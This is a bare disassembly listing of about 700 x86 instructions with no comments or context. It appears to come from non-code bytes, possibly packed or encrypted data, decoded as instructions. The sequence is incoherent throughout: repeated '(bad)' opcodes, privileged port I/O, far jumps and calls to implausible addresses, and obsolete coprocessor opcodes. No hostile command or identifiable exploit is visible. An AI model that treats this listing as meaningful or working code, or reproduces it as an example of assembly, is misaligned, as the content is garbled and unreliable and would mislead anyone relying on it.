  413d0c:	push   edx
  413d0d:	stos   BYTE PTR es:[edi],al
  413d0e:	fisttp DWORD PTR [eax]
  413d10:	stos   BYTE PTR es:[edi],al
  413d11:	imul   eax,DWORD PTR [edi+0x2eaa2af2],0xffffff8e
  413d18:	adc    BYTE PTR [ebx-0xd],al
  413d1b:	mov    DWORD PTR [edi+0xd],edi
  413d1e:	and    eax,esp
  413d20:	out    dx,eax
  413d21:	in     eax,0x55
  413d23:	shl    BYTE PTR [eax+0x76],0xfd
  413d27:	dec    edi
  413d28:	(bad)  
  413d2a:	scas   eax,DWORD PTR es:[edi]
  413d2b:	das    
  413d2c:	xor    BYTE PTR [edx-0x55],bh
  413d2f:	not    BYTE PTR [edx+0x7577e7c5]
  413d35:	ret    0x30c4
  413d38:	inc    esi
  413d39:	into   
  413d3a:	sub    edi,0xffffffa0
  413d3d:	jae    0x413d44
  413d3f:	pop    edi
  413d40:	std    
  413d41:	clc    
  413d42:	pop    es
  413d43:	sub    DWORD PTR [eax-0x19],esp
  413d46:	mov    BYTE PTR [edi+0x58df7581],ah
  413d4c:	jl     0x413cf8
  413d4e:	or     ecx,edx
  413d50:	(bad)  
  413d51:	add    BYTE PTR [edx+0x750f6a14],bh
  413d57:	mov    eax,ds:0xd2e5ccaf
  413d5c:	cwde   
  413d5d:	retf   
  413d5e:	clc    
  413d5f:	ds test ecx,0x28df760a
  413d66:	jge    0x413d54
  413d68:	mov    WORD PTR [edx+esi*2+0x41],?
  413d6c:	lahf   
  413d6d:	xchg   edi,eax
  413d6e:	xchg   ecx,eax
  413d6f:	std    
  413d70:	jbe    0x413d70
  413d72:	mov    dl,0x87
  413d74:	push   ds
  413d75:	out    0x7a,eax
  413d77:	sbb    bl,BYTE PTR [ecx+edi*2]
  413d7a:	cli    
  413d7b:	xchg   BYTE PTR [ebx],cl
  413d7d:	dec    ecx
  413d7e:	xor    al,0x33
  413d80:	repnz pop eax
  413d82:	sar    DWORD PTR [edi],1
  413d84:	cdq    
  413d85:	cli    
  413d86:	daa    
  413d87:	jne    0x413d49
  413d89:	dec    edi
  413d8a:	cmp    cl,BYTE PTR ss:[edi]
  413d8d:	mov    eax,0xcaffb678
  413d92:	add    BYTE PTR [edx+0x2ee4ad45],al
  413d98:	pop    edi
  413d99:	add    BYTE PTR [eax+0x4c0e6cbe],0xe
  413da0:	push   ss
  413da1:	xor    BYTE PTR [ebx+0x63f33c29],ah
  413da7:	adc    edx,edi
  413da9:	aam    0xf2
  413dab:	mov    edx,0x56f531bc
  413db0:	mov    bh,0xaa
  413db2:	ret    0x244a
  413db5:	dec    ecx
  413db6:	repnz sbb eax,0x1760c399
  413dbc:	(bad)  
  413dbd:	jns    0x413d50
  413dbf:	mov    dl,0x5
  413dc1:	call   DWORD PTR [ebp+0x24b1bd4b]
  413dc7:	jae    0x413d62
  413dc9:	addr16 int 0xc4
  413dcc:	lods   eax,DWORD PTR ds:[esi]
  413dcd:	jp     0x413dd1
  413dcf:	in     al,0x96
  413dd1:	xor    edi,0x917ac4d8
  413dd7:	fnstsw WORD PTR [esi+eiz*8]
  413dda:	sti    
  413ddb:	test   DWORD PTR [esi-0x44cd58ea],ebp
  413de1:	loop   0x413e0e
  413de3:	mov    eax,0x8085763
  413de8:	or     dl,BYTE PTR [esi]
  413dea:	fimul  WORD PTR [ebx]
  413dec:	sbb    DWORD PTR [ebx],edi
  413dee:	mov    ecx,0xb8ba610d
  413df3:	push   DWORD PTR [edx+0x54fd0443]
  413df9:	ror    DWORD PTR [eax+0x1a39b119],1
  413dff:	inc    eax
  413e00:	loope  0x413e66
  413e02:	mov    ds:0xed8a8ebc,eax
  413e07:	xchg   ebp,eax
  413e08:	and    eax,0x1a310161
  413e0d:	addr16 cs push edx
  413e10:	xor    eax,0x4d7a2a16
  413e15:	jbe    0x413d97
  413e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e18:	xchg   esi,eax
  413e19:	xchg   edi,eax
  413e1a:	(bad)  [eax-0x66]
  413e1d:	jmp    0x413e69
  413e1f:	dec    edi
  413e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e21:	mov    BYTE PTR [edi],bh
  413e23:	fmul   st,st(5)
  413e25:	(bad)  
  413e26:	push   cs
  413e27:	add    DWORD PTR [ecx-0x396ee8f1],eax
  413e2d:	mov    esi,0xe86b697f
  413e32:	jne    0x413e28
  413e34:	or     al,0x2c
  413e36:	pop    ss
  413e37:	mov    esp,0x3f61f885
  413e3c:	mov    bh,0xa4
  413e3e:	scas   eax,DWORD PTR es:[edi]
  413e3f:	push   0xfffffff1
  413e41:	(bad)  
  413e42:	mov    ds:0x4c625606,al
  413e47:	inc    edi
  413e48:	repz or al,0x37
  413e4b:	jne    0x413e5b
  413e4d:	push   0x1befdc44
  413e52:	pop    ebp
  413e53:	mov    WORD PTR [esi],ss
  413e55:	bound  esp,QWORD PTR [eax+0x70]
  413e58:	cmp    eax,0xbc0a955d
  413e5d:	test   BYTE PTR [edx+0x6d],dh
  413e60:	cld    
  413e61:	jmp    0xc275:0xa2bf5aa9
  413e68:	jle    0x413e6c
  413e6a:	faddp  st(1),st
  413e6c:	mov    WORD PTR [esi],es
  413e6e:	jl     0x413e04
  413e70:	pop    ss
  413e71:	inc    edx
  413e72:	mov    dl,0x46
  413e74:	out    0xfd,al
  413e76:	bound  edi,QWORD PTR [edx]
  413e78:	mov    ebx,DWORD PTR [ebx-0x21aeea3f]
  413e7e:	inc    edx
  413e7f:	jbe    0x413ede
  413e81:	fldenv [edx+0x5e43cf8d]
  413e87:	fld    QWORD PTR [ebx+0x1e5e5026]
  413e8d:	test   DWORD PTR [edi],edi
  413e8f:	(bad)  
  413e90:	sbb    ah,ah
  413e92:	mov    eax,ds:0x581afdc5
  413e97:	rcl    DWORD PTR [eax+0x2935639],0x6f
  413e9e:	mov    cl,0x16
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	ds inc esp
  413eb9:	dec    edx
  413eba:	xchg   esp,eax
  413ebb:	out    dx,eax
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	addr16 mov cl,0xc0
  413ec6:	mov    eax,cs
  413ec8:	imul   ebx,DWORD PTR [edx+ebx*2-0x55],0xffffff9e
  413ecd:	int    0x7b
  413ecf:	and    esi,eax
  413ed1:	frstor [ecx]
  413ed3:	sar    DWORD PTR [ebx-0x36221494],cl
  413ed9:	leave  
  413eda:	push   0x3b343a4
  413edf:	fldcw  WORD PTR [ebx]
  413ee1:	xchg   esp,eax
  413ee2:	aam    0xf8
  413ee4:	fiadd  WORD PTR [ecx+0x796b8f9]
  413eea:	push   ds
  413eeb:	in     al,0x64
  413eed:	xchg   esp,eax
  413eee:	inc    esp
  413eef:	jmp    0x374f:0xc61b3fdd
  413ef6:	dec    eax
  413ef7:	shl    BYTE PTR [edi-0x70],cl
  413efa:	xor    edx,esi
  413efc:	test   BYTE PTR [edx-0x39],dl
  413eff:	sbb    edx,DWORD PTR [ebx-0x78]
  413f02:	pop    edi
  413f03:	pop    ebx
  413f04:	clc    
  413f05:	loope  0x413edc
  413f07:	xchg   DWORD PTR [edx-0x5dd5ba01],edi
  413f0d:	push   es
  413f0e:	pushf  
  413f0f:	popf   
  413f10:	aad    0x3e
  413f12:	mov    dh,0xef
  413f14:	cmp    BYTE PTR [ebp-0x2168dcea],bl
  413f1a:	repz mov al,ds:0xb857db29
  413f20:	sub    eax,0xa09346e9
  413f25:	xor    eax,0x4b4324c
  413f2a:	sbb    al,cl
  413f2c:	call   0x5856b361
  413f31:	jne    0x413ece
  413f33:	mov    ebp,0x84218e4f
  413f38:	inc    esp
  413f39:	mov    cl,0x3a
  413f3b:	std    
  413f3c:	pop    ecx
  413f3e:	mov    ebx,0xefc72a49
  413f43:	adc    DWORD PTR [edx-0x59],0x31
  413f47:	outs   dx,DWORD PTR ds:[esi]
  413f48:	sbb    al,0xb7
  413f4a:	jle    0x413f95
  413f4c:	mov    ch,0xe1
  413f4e:	inc    ebx
  413f4f:	lock cli 
  413f51:	mov    ds:0x43fe001a,al
  413f56:	ficomp WORD PTR [edx]
  413f58:	jmp    0xb6b8:0xca4c0b09
  413f5f:	xor    al,0x72
  413f61:	mov    al,ds:0x72baf5d5
  413f66:	into   
  413f67:	sar    BYTE PTR [ebp+0x4989efe4],1
  413f6d:	imul   esp,ebx,0x49
  413f70:	mov    al,0xf5
  413f72:	xchg   DWORD PTR [esi],ebx
  413f74:	dec    esi
  413f75:	les    eax,FWORD PTR [eax-0x1195eaec]
  413f7b:	add    edx,DWORD PTR [ebx+0x39]
  413f7e:	fistp  QWORD PTR [esi]
  413f80:	enter  0x4cb,0x20
  413f84:	lods   al,BYTE PTR ds:[esi]
  413f85:	(bad)  
  413f86:	daa    
  413f87:	mov    al,0x50
  413f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f8a:	xchg   BYTE PTR [edi],cl
  413f8c:	out    0xa2,eax
  413f8e:	xor    BYTE PTR [eax-0x66],0xa5
  413f92:	lods   al,BYTE PTR ds:[esi]
  413f93:	cld    
  413f94:	rcr    BYTE PTR [ebp+0x5a52d248],0x72
  413f9b:	mov    bl,0xe6
  413f9d:	mov    al,ds:0xdea51c66
  413fa2:	inc    edi
  413fa3:	loop   0x413f4f
  413fa5:	(bad)  
  413fa7:	mov    ch,0x80
  413fa9:	lods   al,BYTE PTR ds:[esi]
  413faa:	push   ebx
  413fab:	adc    eax,0xbc7e7de8
  413fb0:	ficomp DWORD PTR [edi+0x4d]
  413fb3:	xor    BYTE PTR [ebp-0x27],ah
  413fb6:	int    0x40
  413fb8:	and    DWORD PTR [eax+eax*4+0x5b],eax
  413fbc:	cld    
  413fbd:	aam    0x6e
  413fbf:	int    0xfe
  413fc1:	mov    edi,0x314873d2
  413fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc7:	and    DWORD PTR [eax+eiz*4-0x497825d4],eax
  413fce:	test   eax,0x9c33b8bc
  413fd3:	push   0x7b2e4963
  413fd8:	jecxz  0x413f9d
  413fda:	clc    
  413fdb:	jg     0x41404d
  413fdd:	and    DWORD PTR [ebx-0xe],ecx
  413fe0:	jg     0x413fed
  413fe2:	je     0x413f8d
  413fe4:	sar    BYTE PTR [edx+0x4ef48c10],1
  413fea:	mov    BYTE PTR [ebx-0x56767c72],cl
  413ff0:	stos   DWORD PTR es:[edi],eax
  413ff1:	hlt    
  413ff2:	or     DWORD PTR [edi],0xe379876d
  413ff8:	mov    DWORD PTR [esp+eax*2+0x22],ecx
  413ffc:	mov    al,0xd5
  413ffe:	push   ebx
  413fff:	inc    ebp
  414000:	jge    0x41407a
  414002:	inc    ecx
  414003:	fneni(8087 only) 
  414005:	dec    edx
  414006:	pop    ss
  414007:	cmc    
  414008:	sti    
  414009:	ss jl  0x413fbd
  41400c:	add    dl,BYTE PTR [eax-0x48]
  41400f:	mov    ch,0xa2
  414011:	call   0x56299585
  414016:	mov    WORD PTR [eax+0x33],es
  414019:	loopne 0x413fc4
  41401b:	call   0x153d:0xab5f28d9
  414022:	xchg   ebp,eax
  414023:	ins    BYTE PTR es:[edi],dx
  414024:	test   al,ch
  414026:	dec    edx
  414027:	popf   
  414028:	fcmovnu st,st(5)
  41402a:	addr16 adc eax,0x65b8351a
  414030:	enter  0xcb72,0x5a
  414034:	or     bh,BYTE PTR [eax+0x2f]
  414037:	pusha  
  414038:	xor    bl,dl
  41403a:	dec    ebp
  41403b:	adc    BYTE PTR [ebp-0x236110e3],dl
  414041:	sbb    cl,ch
  414043:	test   al,0x29
  414045:	dec    edx
  414046:	or     ebp,esp
  414048:	cmp    ecx,edx
  41404a:	jmp    0xd3315758
  41404f:	outs   dx,DWORD PTR ds:[esi]
  414050:	arpl   di,di
  414052:	daa    
  414053:	sub    al,0x93
  414055:	(bad)  [edi-0x38]
  414058:	cmc    
  414059:	imul   BYTE PTR ds:0x8448663
  41405f:	rol    DWORD PTR [esi],0x95
  414062:	push   esi
  414063:	push   es
  414064:	out    0x4c,eax
  414066:	push   edx
  414067:	xor    ebp,esi
  414069:	lods   eax,DWORD PTR ds:[esi]
  41406a:	fcom   QWORD PTR [esi]
  41406c:	out    0xdc,eax
  41406e:	inc    edx
  41406f:	mov    eax,0x6c3fc139
  414074:	add    bh,bl
  414076:	mov    WORD PTR [ebx+0x6d],?
  414079:	rol    DWORD PTR [ebx],0x9d
  41407c:	popf   
  41407d:	lods   al,BYTE PTR ds:[esi]
  41407e:	loop   0x414008
  414080:	xor    al,0xb8
  414082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414083:	and    DWORD PTR [esi],ebx
  414085:	pop    edx
  414086:	mov    edx,0xdecc152b
  41408b:	xchg   edx,eax
  41408c:	push   eax
  41408d:	retf   0x721e
  414090:	mov    BYTE PTR [ebx+0xeac6499],0x21
  414097:	dec    esi
  414098:	pop    ss
  414099:	dec    eax
  41409a:	push   DWORD PTR [edi]
  41409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41409d:	jl     0x41404c
  41409f:	cdq    
  4140a0:	jmp    0x2ac1125a
  4140a5:	or     DWORD PTR [ebp-0x2994551a],ecx
  4140ab:	add    eax,0x68c007cf
  4140b0:	jmp    0xb58340fb
  4140b5:	cld    
  4140b6:	popf   
  4140b7:	mov    edx,0xf76a2c06
  4140bc:	mov    al,ds:0x9f188128
  4140c1:	cmp    BYTE PTR [esi],dh
  4140c3:	into   
  4140c4:	mov    esp,0x877194fa
  4140c9:	outs   dx,BYTE PTR es:[esi]
  4140cb:	scas   eax,DWORD PTR es:[edi]
  4140cc:	in     al,0x79
  4140ce:	cld    
  4140cf:	gs xchg ecx,eax
  4140d1:	data16 sbb BYTE PTR [ecx-0x5508e9a],0xb1
  4140d9:	or     ebp,DWORD PTR [edi+0x67c49bb2]
  4140df:	push   esp
  4140e0:	hlt    
  4140e1:	adc    BYTE PTR [edx-0x6a13393a],bl
  4140e7:	es xchg ebp,eax
  4140e9:	xchg   ecx,eax
  4140ea:	repz ja 0x414099
  4140ed:	inc    eax
  4140ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ef:	push   es
  4140f0:	jecxz  0x414095
  4140f2:	cmp    DWORD PTR [esi+0x5a],ecx
  4140f5:	jp     0x414146
  4140f7:	int3   
  4140f8:	pop    ebx
  4140f9:	and    ch,BYTE PTR [ecx+ecx*4+0x61]
  4140fd:	enter  0x94a,0xe4
  414101:	sbb    BYTE PTR ss:[eax],0xa4
  414105:	(bad)  
  414106:	jbe    0x41417b
  414108:	fbstp  TBYTE PTR [esi-0x49]
  41410b:	jmp    0x414118
  41410d:	out    0x2e,al
  41410f:	sbb    DWORD PTR [edx+0x4e],edi
  414112:	and    dl,BYTE PTR [ecx]
  414114:	shl    DWORD PTR [esp+esi*2-0x1b6e99f8],1
  41411b:	(bad)  
  41411c:	call   0x5a23254f
  414121:	and    cl,BYTE PTR [eax-0x6f]
  414124:	cli    
  414125:	push   esi
  414126:	lods   eax,DWORD PTR ds:[esi]
  414127:	push   ss
  414128:	rol    DWORD PTR [edi+esi*4+0x33a99f6d],1
  41412f:	fsubr  st,st(1)
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x73145a14
  414142:	sub    eax,0x4546c56
  414147:	jg     0x4141c1
  414149:	in     eax,0x7e
  41414b:	js     0x4141c5
  41414d:	jmp    0x9df4:0x9f340fbe
  414154:	xor    DWORD PTR [ebx],ebp
  414156:	call   0x3b3b:0x71b0ae88
  41415d:	int3   
  41415e:	int3   
  41415f:	sbb    DWORD PTR [ecx+0x262cba93],ecx
  414165:	push   edx
  414166:	sbb    dl,BYTE PTR [ebx+0x77]
  414169:	and    BYTE PTR [eax],dh
  41416b:	clc    
  41416c:	sbb    esp,DWORD PTR [ebp+0x32]
  41416f:	or     al,0x8d
  414171:	daa    
  414172:	ficomp WORD PTR [edi]
  414174:	push   esi
  414175:	stos   DWORD PTR es:[edi],eax
  414176:	out    dx,eax
  414177:	sbb    ebx,DWORD PTR [edx+0x6d0545c9]
  41417d:	mov    al,0x45
  41417f:	retf   0x307d
  414182:	mov    edx,0x65db77a7
  414187:	lods   al,BYTE PTR ds:[esi]
  414188:	cld    
  414189:	cmp    DWORD PTR [edi+0x591983e2],edx
  41418f:	bound  eax,QWORD PTR [esi+0x1bc9a843]
  414195:	test   eax,0x7e24e010
  41419a:	jb     0x41418a
  41419c:	jae    0x414152
  41419e:	out    0xac,eax
  4141a0:	xor    BYTE PTR [edx-0x4fc99d13],bl
  4141a6:	add    ah,BYTE PTR [ebx]
  4141a8:	mov    WORD PTR [esp+edx*2+0xf],gs
  4141ac:	jbe    0x4141e1
  4141ae:	in     al,dx
  4141af:	(bad)  
  4141b0:	ror    BYTE PTR [esi-0x1],1
  4141b3:	scas   eax,DWORD PTR es:[edi]
  4141b4:	lock mov edi,0xf05fd460
  4141ba:	pop    ecx
  4141bb:	xor    eax,0x19d694c9
  4141c0:	jl     0x414208
  4141c2:	retf   0x5bc7
  4141c5:	and    al,0xd5
  4141c7:	je     0x414237
  4141c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ca:	or     eax,0x5c877502
  4141cf:	xlat   BYTE PTR ds:[ebx]
  4141d0:	retf   0x6d10
  4141d3:	xchg   edx,eax
  4141d4:	(bad)  
  4141d5:	std    
  4141d6:	xor    BYTE PTR [ebp-0x4b],dl
  4141d9:	and    BYTE PTR [ecx-0x28],dl
  4141dc:	scas   al,BYTE PTR es:[edi]
  4141dd:	clc    
  4141de:	fisub  WORD PTR ds:0xac74c3b6
  4141e4:	xor    al,BYTE PTR [ecx-0x5a8105c4]
  4141ea:	add    bh,bh
  4141ec:	and    eax,0xb411ce9a
  4141f1:	pop    es
  4141f2:	daa    
  4141f3:	sti    
  4141f4:	retf   0xf966
  4141f7:	xchg   ecx,eax
  4141f8:	mov    ch,0x91
  4141fa:	ins    DWORD PTR es:[edi],dx
  4141fb:	bound  edi,QWORD PTR [edx-0x4e92fbae]
  414201:	sbb    eax,0xb818fdf9
  414206:	adc    al,0x82
  414208:	sub    BYTE PTR [ecx],dl
  41420a:	aad    0x58
  41420c:	and    eax,0xa8ad341d
  414211:	push   edi
  414212:	ss aad 0xba
  414215:	sub    cl,BYTE PTR [ecx+edi*1-0x3b]
  414219:	pop    ecx
  41421a:	inc    esp
  41421b:	dec    ebp
  41421c:	sar    BYTE PTR [ecx-0x7a],0x19
  414220:	push   ebp
  414221:	or     al,0x35
  414223:	mov    esi,esp
  414225:	hlt    
  414226:	mov    ch,0x41
  414228:	push   esi
  414229:	inc    ebp
  41422a:	adc    ecx,DWORD PTR [ebx]
  41422c:	and    BYTE PTR [ecx],dh
  41422e:	fmul   st,st(2)
  414230:	mov    eax,0x16bb83db
  414235:	push   es
  414236:	push   esp
  414237:	outs   dx,DWORD PTR ds:[esi]
  414238:	pop    esi
  414239:	mov    bh,0x49
  41423b:	imul   ebx,DWORD PTR [esi-0x2e],0x68
  41423f:	daa    
  414240:	and    bh,0xca
  414243:	cmp    edx,DWORD PTR [ebp+0x52]
  414246:	pop    esi
  414247:	inc    ecx
  414248:	fwait
  414249:	(bad)  
  41424a:	test   DWORD PTR [edi],0xdcfc481c
  414250:	enter  0xf8d7,0x16
  414254:	sub    dh,ch
  414256:	aaa    
  414257:	std    
  414258:	stos   DWORD PTR es:[edi],eax
  414259:	outs   dx,BYTE PTR ds:[esi]
  41425a:	or     eax,ebx
  41425c:	mov    esi,ebp
  41425e:	pushf  
  41425f:	test   DWORD PTR [ecx+0x73],ebx
  414262:	sbb    eax,DWORD PTR [ebx]
  414264:	(bad)  
  414265:	jmp    0x41420b
  414267:	pop    edx
  414268:	fst    DWORD PTR [ebp+0x60cc80ae]
  41426e:	ret    0x74bd
  414271:	mov    BYTE PTR [eax+eax*4+0x3c2ec114],0x3f
  414279:	mov    esp,0x6d73bc01
  41427e:	aas    
  41427f:	ror    BYTE PTR [edi+esi*1],0x36
  414283:	push   es
  414284:	jbe    0x4142fa
  414286:	jo     0x41421d
  414288:	retf   0x802f
  41428b:	adc    al,0x62
  41428d:	mov    dl,0xb6
  41428f:	imul   edi,DWORD PTR ds:0x92caf69c,0x6760a7e4
  414299:	jecxz  0x414305
  41429b:	push   0xffffffb4
  41429d:	adc    DWORD PTR [esi-0x18],ebp
  4142a0:	xor    al,0x7f
  4142a2:	rcl    BYTE PTR [edi],0xff
  4142a5:	js     0x41425a
  4142a7:	cmc    
  4142a8:	into   
  4142a9:	mov    ecx,0xce35cba5
  4142ae:	sbb    eax,0xcd5896f4
  4142b3:	inc    ebx
  4142b4:	fbstp  TBYTE PTR [ebx+edx*2-0x225254ac]
  4142bb:	pop    edx
  4142bc:	xchg   ebp,eax
  4142bd:	stos   DWORD PTR es:[edi],eax
  4142be:	pop    ebx
  4142bf:	add    edi,esi
  4142c1:	xchg   edx,eax
  4142c2:	push   0xfffffff3
  4142c4:	sbb    DWORD PTR [ecx+0x59],ecx
  4142c7:	in     eax,0xdd
  4142c9:	(bad)  
  4142ca:	push   ds
  4142cb:	lods   al,BYTE PTR ds:[esi]
  4142cc:	cmp    BYTE PTR [ecx+0x66],0x47
  4142d0:	add    eax,esi
  4142d2:	xchg   ecx,eax
  4142d3:	pop    ss
  4142d4:	addr16 pop edi
  4142d6:	or     ebx,DWORD PTR [edx+ebx*2+0x2c9e0a16]
  4142dd:	pop    eax
  4142de:	xor    edx,0xffd1ea07
  4142e4:	rol    bl,1
  4142e6:	sbb    eax,0x3e7c88f2
  4142eb:	out    0xb2,al
  4142ed:	or     al,0x2d
  4142ef:	cdq    
  4142f0:	test   eax,0x1f412458
  4142f5:	and    eax,0x8793affa
  4142fa:	loopne 0x414301
  4142fc:	fucom  st(3)
  4142fe:	jmp    0x8e30:0x30a116ab
  414305:	stc    
  414306:	jb     0x414373
  414308:	ficom  WORD PTR [ecx+0x21]
  41430b:	scas   al,BYTE PTR es:[edi]
  41430c:	push   es
  41430d:	mov    ch,0x1e
  41430f:	sub    al,0x86
  414311:	mov    ebp,0x176f521d
  414316:	lea    ecx,[ebp-0x6c]
  414319:	jg     0x414352
  41431b:	test   ch,ch
  41431d:	push   ebx
  41431e:	out    dx,al
  41431f:	fbld   TBYTE PTR [ebx]
  414321:	mov    eax,ds:0x6d6152c8
  414326:	add    cl,dh
  414328:	pusha  
  414329:	xor    eax,0xda80ac2c
  41432e:	outs   dx,DWORD PTR ds:[esi]
  41432f:	mov    ah,0xe9
  414331:	xor    al,0x12
  414333:	lea    edx,[esi+0x72]
  414336:	sbb    BYTE PTR [esi+eax*2-0x53],al
  41433a:	mov    eax,ds:0x5374c88a
  41433f:	pop    edx
  414340:	aad    0x94
  414342:	mov    eax,cs:0xc69bb0f
  414348:	pop    edx
  414349:	test   BYTE PTR [ecx+0x18],0x8b
  41434d:	or     dl,bl
  41434f:	pop    es
  414350:	rol    DWORD PTR [edx-0x1cc2b9f7],0xfc
  414357:	mov    bh,0x98
  414359:	dec    ecx
  41435a:	cdq    
  41435b:	ret    
  41435c:	add    al,0x54
  41435e:	adc    BYTE PTR [eax-0x55d5de6],bh
  414364:	mov    bh,0x79
  414366:	mov    dh,0x2c
  414368:	jbe    0x414392
  41436a:	out    dx,eax
  41436b:	lea    edx,[ecx]
  41436d:	gs je  0x41436f
  414370:	icebp  
  414371:	xchg   BYTE PTR [ecx+0x2a868653],bh
  414377:	dec    ecx
  414378:	cs adc edi,ecx
  41437b:	int3   
  41437c:	or     BYTE PTR [esi-0x11cebd90],dh
  414382:	retf   
  414383:	js     0x41438e
  414385:	mov    ebp,0xa21149d1
  41438a:	in     al,dx
  41438b:	add    ebp,edi
  41438d:	popf   
  41438e:	jns    0x414387
  414390:	and    ebx,DWORD PTR [edx]
  414392:	cdq    
  414393:	cld    
  414394:	inc    esp
  414395:	data16 jmp 0x414409
  414398:	jne    0x414355
  41439a:	rol    BYTE PTR [edx+0x76ee14d0],1
  4143a0:	retf   
  4143a1:	xor    BYTE PTR [esi],dl
  4143a3:	pop    edx
  4143a4:	fisttp WORD PTR [edx-0x25f37c5e]
  4143aa:	jbe    0x41434d
  4143ac:	xchg   edx,eax
  4143ad:	ss push ebx
  4143af:	push   ss
  4143b0:	sub    BYTE PTR [ebp+0x15d5d9ab],dh
  4143b6:	xchg   edx,eax
  4143b7:	lds    ebp,FWORD PTR [ebx]
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	std    
  4143e5:	sub    BYTE PTR ds:0x7f09c13c,0x78
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	sub    al,0xfc
  4143f2:	xor    BYTE PTR [esi],ah
  4143f4:	fild   WORD PTR [eax]
  4143f6:	(bad)  
  4143f7:	jbe    0x41439a
  4143f9:	jge    0x4143f7
  4143fb:	mov    ?,edi
  4143fd:	mov    ds:0x7f51f5b8,eax
  414402:	add    eax,0x44720439
  414407:	mov    BYTE PTR [edi],ah
  414409:	inc    edx
  41440a:	nop
  41440b:	cli    
  41440c:	jnp    0x4143ad
  41440e:	and    BYTE PTR [edx],0x1c
  414411:	cmp    ah,bl
  414413:	pop    ds
  414414:	or     eax,0x3e5c7e56
  414419:	dec    ecx
  41441a:	cdq    
  41441b:	mov    ebp,0xdd906c42
  414420:	jg     0x4143c3
  414422:	ret    
  414423:	xor    cl,BYTE PTR [eax-0xb0c554b]
  414429:	push   0xddc9658d
  41442e:	adc    dl,BYTE PTR [esi+ebx*8+0x67]
  414432:	mov    ebp,0x233152b1
  414437:	jnp    0x414499
  414439:	out    dx,al
  41443a:	mov    cl,dh
  41443c:	push   edi
  41443d:	out    0x86,eax
  41443f:	stc    
  414440:	mov    eax,0x6c059f35
  414445:	add    DWORD PTR [eax-0x27],0xea98bb53
  41444c:	call   0xe8c8e10a
  414451:	das    
  414452:	iret   
  414453:	add    al,0xed
  414455:	adc    BYTE PTR ds:0x331c2c33,ah
  41445b:	dec    ebp
  41445c:	fcmovbe st,st(3)
  41445e:	sub    al,0x73
  414460:	ins    BYTE PTR es:[edi],dx
  414461:	pop    esp
  414462:	frstpm(287 only) 
  414464:	sahf   
  414465:	pop    esi
  414466:	sub    BYTE PTR [ecx],dh
  414468:	cmp    BYTE PTR [eax],dh
  41446a:	ins    DWORD PTR es:[edi],dx
  41446b:	imul   esi,DWORD PTR [eax-0x18],0xc355048f
  414472:	jecxz  0x4144d0
  414474:	scas   al,BYTE PTR es:[edi]
  414475:	inc    ebx
  414476:	push   es
  414477:	nop    DWORD PTR [eax-0x624de42]
  41447e:	jno    0x4144ae
  414480:	adc    ebx,ebx
  414482:	xchg   edi,eax
  414483:	dec    edx
  414484:	test   BYTE PTR ds:0x7564,cl
  414489:	mov    bl,0x7c
  41448b:	mov    edx,0x5fa3c989
  414490:	push   eax
  414491:	repnz loop 0x4144be
  414494:	sbb    al,ah
  414496:	pop    edx
  414497:	in     al,0x26
  414499:	repnz fld TBYTE PTR [edx+0x19bca96f]
  4144a0:	lea    ebx,[ebx]
  4144a2:	lods   eax,DWORD PTR ds:[esi]
  4144a3:	out    dx,eax
  4144a4:	aaa    
  4144a5:	jb     0x4144aa
  4144a7:	and    ah,BYTE PTR [ebx+0x5d]
  4144aa:	add    dl,ah
  4144ac:	call   0x6cb5:0xcc1cfd8e
  4144b3:	cmp    BYTE PTR [esi-0x61],cl
  4144b6:	test   al,0xc4
  4144b8:	lea    ebp,[eax+edx*8+0x22]
  4144bc:	or     al,0xf6
  4144be:	jo     0x4144e7
  4144c0:	fisttp WORD PTR [ecx-0x4c7e8b4c]
  4144c6:	stos   BYTE PTR es:[edi],al
  4144c7:	mov    al,0xcb
  4144c9:	add    bl,BYTE PTR [ebx-0x17]
  4144cc:	aad    0x2b
  4144ce:	sbb    al,0xe8
  4144d0:	jmp    0x414536
  4144d2:	bound  ebp,QWORD PTR [edi+0xc]
  4144d5:	sub    eax,0x6a6cb086
  4144da:	mov    ?,WORD PTR [ebp+0x5f]
  4144dd:	loop   0x41446e
  4144df:	mov    esi,ecx
  4144e1:	pop    esp
  4144e2:	cs mov bl,0xee
  4144e5:	adc    ah,BYTE PTR [edi]
  4144e7:	stc    
  4144e8:	mov    dl,0xec
  4144ea:	test   eax,0x6cf99bbb
  4144ef:	pop    ebx
  4144f0:	push   0xffffffb5
  4144f2:	inc    ecx
  4144f3:	inc    edi
  4144f4:	push   edx
  4144f5:	xchg   DWORD PTR [eax],eax
  4144f7:	add    BYTE PTR [edx+0x184531e],bh
  4144fd:	not    BYTE PTR [edi]
  4144ff:	fild   WORD PTR [ebx-0x50ee0500]
  414505:	cmp    eax,0x39e8cb9b
  41450a:	fidivr WORD PTR [eax+eiz*4-0x7b]
